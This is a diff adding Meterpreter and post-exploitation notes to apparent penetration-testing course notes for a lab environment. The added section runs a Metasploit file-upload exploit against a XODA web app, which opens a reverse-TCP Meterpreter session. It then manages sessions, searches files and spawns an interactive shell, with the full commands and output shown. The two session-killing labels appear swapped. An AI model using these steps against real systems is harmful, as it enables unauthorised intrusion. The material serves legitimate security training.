@@ -44,6 +44,8 @@
     - Exploiting A Vulnerable SSH Server    
     - Exploiting A Vulnerable SMTP Server
   - Post Exploitation Fundamentals
+    - Meterpreter Fundamentals 
+    - Upgrading Command Shells To Meterpreter Shells    
   - Windows Post Exploitation
   - Linux Post Exploitation
 
@@ -2004,3 +2006,322 @@ meterpreter > getuid
 Server username: uid=0, gid=0, euid=0, egid=0
 ```
 
+
+
+---
+
+### Post Exploitation Fundamentals
+
++ Post exploitation refers to the actions performed on the target system after initial access has been obtained.
++ The post exploitation phase of a penetration test consists of various techniques like:
+  + Local Enumeration
+  + Privilege Escalation
+  + Dumping Hashes
+  + Establishing Persistence
+  + Clearing Your Tracks
+  + Pivoting
+
+
+
+#### Meterpreter Fundamentals    
+
++ The Meterpreter (Meta-Interpreter) payload is an advanced multi-functional payload that operates via DLL injection and is executed in memory on the target system, consequently making it difficult to detect.
++ It communicates over a stager socket and provides an attacker with an interactive command interpreter on the target system that facilitates the execution of system commands, file system navigation, keylogging and much more.
++ Meterpreter also allows us to load custom script and plugins dynamically.
++ MSF provides us with various types of meterpreter payloads that can be used based on the target environment and the OS architecture.
+
+
+
+```bash
+root@attackdefense:~# nmap 192.180.12.3 -sV
+Starting Nmap 7.70 ( https://nmap.org ) at 2024-02-02 16:54 UTC
+Nmap scan report for target-1 (192.180.12.3)
+Host is up (0.000013s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
+3306/tcp open  mysql   MySQL 5.5.47-0ubuntu0.14.04.1
+MAC Address: 02:42:C0:B4:0C:03 (Unknown)
+```
+
+
+
+
+
+```bash
+msf5 > db_status 
+[*] Connected to msf. Connection type: postgresql.
+msf5 > workspace -a meterpreter
+[*] Added workspace: meterpreter
+[*] Workspace: meterpreter
+msf5 > setg RHOSTS root@attackdefense:~# nmap 192.180.12.3 -sV
+RHOSTS => root@attackdefense:~# nmap 192.180.12.3 -sV
+msf5 > Starting Nmap 7.70 ( https://nmap.org ) at 2024-02-02 16:54 UTC
+[-] Unknown command: Starting.
+msf5 > Nmap scan report for target-1 (192.180.12.3)
+[-] Unknown command: Nmap.
+msf5 > Host is up (0.000013s latency).
+[-] Unknown command: Host.
+msf5 > Not shown: 998 closed ports
+^CInterrupt: use the 'exit' command to quit
+msf5 > setg RHOSTS 192.180.12.3
+RHOSTS => 192.180.12.3
+msf5 > db_nmap -sV 192.180.12.3
+[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2024-02-02 16:55 UTC
+[*] Nmap: Nmap scan report for target-1 (192.180.12.3)
+[*] Nmap: Host is up (0.0000090s latency).
+[*] Nmap: Not shown: 998 closed ports
+[*] Nmap: PORT     STATE SERVICE VERSION
+[*] Nmap: 80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
+[*] Nmap: 3306/tcp open  mysql   MySQL 5.5.47-0ubuntu0.14.04.1
+[*] Nmap: MAC Address: 02:42:C0:B4:0C:03 (Unknown)
+[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 6.54 seconds
+msf5 > hosts 
+
+Hosts
+=====
+
+address       mac                name      os_name  os_flavor  os_sp  purpose  info  comments
+-------       ---                ----      -------  ---------  -----  -------  ----  --------
+192.180.12.3  02:42:c0:b4:0c:03  target-1  Linux                      server         
+
+msf5 > services 
+Services
+========
+
+host          port  proto  name   state  info
+----          ----  -----  ----   -----  ----
+192.180.12.3  80    tcp    http   open   Apache httpd 2.4.7 (Ubuntu)
+192.180.12.3  3306  tcp    mysql  open   MySQL 5.5.47-0ubuntu0.14.04.1
+
+msf5 > curl http://192.180.12.3
+[*] exec: curl http://192.180.12.3
+
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1315  100  1315    0     0  1284k      0 --:--:-- --:--:-- --:--:-- 1284k
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+        <title>XODA</title>
+                <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+                        <script language="JavaScript" type="text/javascript">
+                        //<![CDATA[
+                        var countselected=0;
+                        function stab(id){var _10=new Array();for(i=0;i<_10.length;i++){document.getElementById(_10[i]).className="tab";}document.getElementById(id).className="stab";}var allfiles=new Array('');
+                        //]]>
+                </script>
+                <script language="JavaScript" type="text/javascript" src="/js/xoda.js"></script>
+                <script language="JavaScript" type="text/javascript" src="/js/sorttable.js"></script>
+                <link rel="stylesheet" href="/style.css" type="text/css" />
+</head>
+
+<body onload="document.lform.username.focus();">
+        <div id="top">
+                <a href="/" title="XODA"><span style="color: #56a;">XO</span><span style="color: #fa5;">D</span><span style="color: #56a;">A</span></a>
+                        </div>
+        <form method="post" action="/?log_in" name="lform" id="login">
+                <p>Username:&nbsp;<input type="text" id="un" name="username" /></p>
+                <p>Password:&nbsp;<input type="password" name="password" /></p>
+                <p><input type="submit" name="submit" value="login" /></p>
+        </form>
+</body>
+</html>
+        msf5 > search xoda
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   1  exploit/unix/webapp/xoda_file_upload  2012-08-21       excellent  Yes    XODA 0.4.5 Arbitrary PHP File Upload Vulnerability
+
+
+msf5 > use exploit/unix/webapp/xoda_file_upload
+msf5 exploit(unix/webapp/xoda_file_upload) > options 
+
+Module options (exploit/unix/webapp/xoda_file_upload):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.180.12.3     yes       The target address range or CIDR identifier
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /xoda/           yes       The base path to the web application
+   VHOST                       no        HTTP server virtual host
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   XODA 0.4.5
+
+
+msf5 exploit(unix/webapp/xoda_file_upload) > set TARGETURI /     <<<<<<====== because xoda was running on the / not /xoda
+TARGETURI => /
+msf5 exploit(unix/webapp/xoda_file_upload) > run
+
+[*] Started reverse TCP handler on 192.180.12.2:4444 
+[*] Sending PHP payload (jncFnWHkJjatDJ.php)
+[*] Executing PHP payload (jncFnWHkJjatDJ.php)
+[*] Sending stage (38247 bytes) to 192.180.12.3
+[*] Meterpreter session 1 opened (192.180.12.2:4444 -> 192.180.12.3:41958) at 2024-02-02 16:57:39 +0000
+[!] Deleting jncFnWHkJjatDJ.php
+
+meterpreter > sysinfo
+Computer    : victim-1
+OS          : Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64
+Meterpreter : php/linux
+meterpreter > getuid
+Server username: www-data (33)
+```
+
+
+
+**view list of sessions**
+
+```bash
+Background session 1? [y/N]  
+msf5 exploit(unix/webapp/xoda_file_upload) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information               Connection
+  --  ----  ----                   -----------               ----------
+  1         meterpreter php/linux  www-data (33) @ victim-1  192.180.12.2:4444 -> 192.180.12.3:41958 (192.180.12.3)
+```
+
+
+
+**execute commands to specific session**
+
+```bash
+msf5 exploit(unix/webapp/xoda_file_upload) > sessions -C sysinfo -i 1
+[*] Running 'sysinfo' on meterpreter session 1 (192.180.12.3)
+Computer    : victim-1
+OS          : Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64
+Meterpreter : php/linux
+```
+
+
+
+**kill specific session**
+
+```bash
+msf5 exploit(unix/webapp/xoda_file_upload) > sessions -K
+```
+
+
+
+**kill all sessions**
+
+```bash
+msf5 exploit(unix/webapp/xoda_file_upload) > sessions -k 1
+```
+
+
+
+**provide a name to a session**
+
+```bash
+msf5 exploit(unix/webapp/xoda_file_upload) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information               Connection
+  --  ----  ----                   -----------               ----------
+  1         meterpreter php/linux  www-data (33) @ victim-1  192.180.12.2:4444 -> 192.180.12.3:41958 (192.180.12.3)
+
+msf5 exploit(unix/webapp/xoda_file_upload) > sessions -n xoda -i 1
+[*] Session 1 named to xoda
+msf5 exploit(unix/webapp/xoda_file_upload) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information               Connection
+  --  ----  ----                   -----------               ----------
+  1   xoda  meterpreter php/linux  www-data (33) @ victim-1  192.180.12.2:4444 -> 192.180.12.3:41958 (192.180.12.3)
+```
+
+
+
+**edit a file**
+
+```bash
+meterpreter > edit flag1
+```
+
+
+
+**get environment variable**
+
+```bash
+meterpreter > getenv PATH
+
+Environment Variables
+=====================
+
+Variable  Value
+--------  -----
+PATH      /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+
+
+
+**search about file in specific directory**
+
+```bash
+meterpreter > search -d /usr/bin -f *backdoor*
+Found 1 result...
+    /usr/bin\backdoor (66 bytes)
+```
+
+
+
+**search about specific extension**
+
+```bash
+meterpreter > search  -f *.php
+Found 5 results...
+    .\config.php (1284 bytes)
+    .\functions.php (40563 bytes)
+    .\index.php (57739 bytes)
+    .\phpinfo.php (19 bytes)
+    .\zipstream.php (18850 bytes)
+```
+
+
+
+**from meterpreter to native shell**
+
+```bash
+meterpreter > shell
+Process 861 created.
+Channel 5 created.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/bash -i
+bash: cannot set terminal process group (478): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@victim-1:/app/Secret Files$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+
+
+**view list of processes**
+
+```bash
+meterpreter > ps
+```
+
+
+
+#### Upgrading Command Shells To Meterpreter Shells    
